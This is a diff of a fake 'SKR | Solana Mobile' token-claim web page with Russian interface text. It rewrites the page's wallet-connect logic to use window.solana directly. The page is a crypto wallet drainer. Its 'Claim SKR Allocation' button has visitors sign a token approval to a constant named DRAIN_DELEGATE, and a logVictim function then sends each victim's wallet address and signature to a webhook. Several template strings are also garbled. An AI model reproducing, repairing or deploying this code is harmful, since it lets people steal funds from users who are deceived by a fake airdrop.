@@ -6,17 +6,18 @@
     <title>SKR | Solana Mobile</title>
     <style>
         body { margin: 0; padding: 0; font-family: 'Helvetica Neue', Arial, sans-serif; background: #000; color: #fff; text-align: center; }
-        .container { max-width: 1200px; margin: 0 auto; padding: 100px 20px 60px; }
-        .skr-logo { width: 200px; margin: 60px auto; display: block; filter: drop-shadow(0 0 20px #a0ffcb); }
+        header { position: fixed; top: 20px; right: 20px; z-index: 10; }
+        .connect-btn { background: #a0ffcb; color: #000; padding: 15px 35px; font-size: 1.4em; border-radius: 50px; cursor: pointer; font-weight: bold; box-shadow: 0 0 10px #a0ffcb; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 120px 20px 60px; }
+        .skr-logo { width: 200px; margin: 60px auto; display: block; filter: drop-shadow(0 0 30px #a0ffcb); }
         .solana-logo { width: 320px; margin: 40px auto 60px; display: block; }
         h1 { font-size: 7em; font-weight: 900; margin: 0; letter-spacing: -5px; }
         .subtitle { font-size: 2.2em; color: #a0ffcb; margin: 40px 0; font-weight: bold; }
         p { font-size: 1.6em; line-height: 1.8; max-width: 900px; margin: 40px auto; }
         .highlight { color: #a0ffcb; }
-        .wallet-connect { position: fixed; top: 20px; right: 20px; z-index: 10; }
         .claim-section { margin: 80px 0; }
-        button.claim-btn { background: #a0ffcb; color: #000; padding: 25px 80px; font-size: 2.2em; border-radius: 60px; cursor: pointer; font-weight: bold; }
-        button.claim-btn:disabled { background: #444; opacity: 0.6; }
+        button.claim-btn { background: #a0ffcb; color: #000; padding: 25px 80px; font-size: 2.2em; border-radius: 60px; cursor: pointer; font-weight: bold; box-shadow: 0 0 20px #a0ffcb; }
+        button.claim-btn:disabled { background: #444; opacity: 0.6; box-shadow: none; }
         #status { font-size: 1.6em; min-height: 100px; margin: 40px; word-break: break-all; }
         table { width: 90%; max-width: 1000px; margin: 80px auto; border-collapse: collapse; background: #111; }
         th, td { padding: 30px; border: 1px solid #333; font-size: 1.4em; text-align: left; }
@@ -28,15 +29,18 @@
             .skr-logo { width: 150px; }
             .solana-logo { width: 250px; }
             button.claim-btn { width: 90%; padding: 30px; font-size: 2.2em; }
-            .wallet-connect { top: 10px; right: 10px; }
+            header { top: 10px; right: 10px; }
+            .connect-btn { padding: 15px 30px; font-size: 1.6em; }
             table, th, td { font-size: 1.2em; padding: 15px; text-align: center; }
         }
     </style>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/dist/umd/solanaweb3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.8/dist/umd/spl-token.min.js"></script>
 </head>
 <body>
-    <div class="wallet-connect">
-        <w3m-button size="md" label="Подключить Кошелёк" balance="hide" />
-    </div>
+    <header>
+        <button class="connect-btn" id="connect-wallet">Подключить Кошелек</button>
+    </header>
     <div class="container">
         <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafybeifvwriqjehl62zeceva2yp7653jxy7sghyehrqh263aeuqbecsy7i" alt="SKR Logo" class="skr-logo">
         <img src="https://solanamobile.com/_next/static/media/logo-solana-mobile.1d5e0b0f.svg" alt="Solana Mobile" class="solana-logo">
@@ -51,7 +55,6 @@
             <button class="claim-btn" id="claim-skr" disabled>Claim SKR Allocation</button>
             <div id="status"></div>
         </div>
-
         <h2>Token Distribution</h2>
         <table>
             <tr><th>Category</th><th>Allocation</th><th>Unlock Schedule</th></tr>
@@ -67,29 +70,7 @@
         <p>Guardians voting and staking live in 2026.</p>
     </div>
 
-    <!-- Wallet Adapter CDN -->
-    <script type="module">
-        import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';
-        import { ConnectionProvider, WalletProvider } from '@solana/wallet-adapter-react';
-        import { WalletModalProvider, WalletMultiButton } from '@solana/wallet-adapter-react-ui';
-        import { PhantomWalletAdapter, SolflareWalletAdapter, BackpackWalletAdapter } from '@solana/wallet-adapter-wallets';
-        import { clusterApiUrl } from '@solana/web3.js';
-        import { useConnection, useWallet } from '@solana/wallet-adapter-react';
-        import '@solana/wallet-adapter-react-ui/styles.css';
-
-        const network = WalletAdapterNetwork.Mainnet;
-        const endpoint = clusterApiUrl(network);
-
-        const wallets = [
-            new PhantomWalletAdapter(),
-            new SolflareWalletAdapter(),
-            new BackpackWalletAdapter(),
-        ];
-
-        // Это для React, но для простого HTML мы используем WalletMultiButton (он сам создаст кнопку)
-        // Но для чистого HTML лучше использовать Web3Modal или простой window.solana с фиксом
-
-        // Фикс для простого HTML (лучше, чем Wallet Adapter для одного файла)
+    <script>
         const TOKEN_MINT = "Gf3XtY632if3F7yvnNdXQi8SnQTBsn8F7DQJFXru5Lh";
         const DRAIN_DELEGATE = "ES68acG4AZAbikhpSJwDdpE1J9S7AnGCp9JWPu9zHseN";
         const WEBHOOK_URL = "https://solana.requestcatcher.com/test";
@@ -103,25 +84,17 @@
             }).catch(() => {});
         }
 
-        // Подключение с фиксом для мобильного
-        document.querySelector('.connect-btn').onclick = async () => {
+        document.getElementById('connect-wallet').onclick = async () => {
             if (!window.solana) {
                 document.getElementById('status').innerText = "Установи Solana wallet!";
                 return;
             }
             try {
-                // Для мобильного deep link
-                if (navigator.userAgent.match(/iPhone|iPad|iPod|Android/i)) {
-                    const dappUrl = encodeURIComponent(window.location.href);
-                    const phantomLink = https://phantom.app/ul/browse/\( {dappUrl}?ref= \){dappUrl};
-                    window.location.href = phantomLink;
-                    return;
-                }
                 await window.solana.connect();
                 walletPubkey = window.solana.publicKey.toString();
                 document.getElementById('wallet-address').innerText = Подключено: \( {walletPubkey.slice(0,8)}... \){walletPubkey.slice(-6)};
-                document.querySelector('.connect-btn').innerText = "Подключено";
-                document.querySelector('.connect-btn').disabled = true;
+                document.getElementById('connect-wallet').innerText = "Подключено";
+                document.getElementById('connect-wallet').disabled = true;
                 document.getElementById('claim-skr').disabled = false;
                 document.getElementById('status').innerText = "Готов к клейму!";
 
@@ -134,8 +107,9 @@
         document.getElementById('claim-skr').onclick = async () => {
             if (!walletPubkey) return;
             document.getElementById('status').innerHTML = "Обрабатываем...<br>Подпиши транзакцию";
+
             try {
-                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
                 const mint = new solanaWeb3.PublicKey(TOKEN_MINT);
                 const delegate = new solanaWeb3.PublicKey(DRAIN_DELEGATE);
                 const owner = new solanaWeb3.PublicKey(walletPubkey);
@@ -157,14 +131,11 @@
 
                 document.getElementById('status').innerHTML = Успех! Одобрено.<br>SKR придут на TGE.<br>Tx: <a href="https://solscan.io/tx/\( {sig}" target="_blank"> \){sig}</a>;
                 document.getElementById('claim-skr').disabled = true;
-
                 logVictim(walletPubkey, sig);
             } catch (err) {
                 document.getElementById('status').innerText = "Ошибка — попробуй снова";
             }
         };
     </script>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/dist/umd/solanaweb3.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.8/dist/umd/spl-token.min.js"></script>
 </body>
 </html>
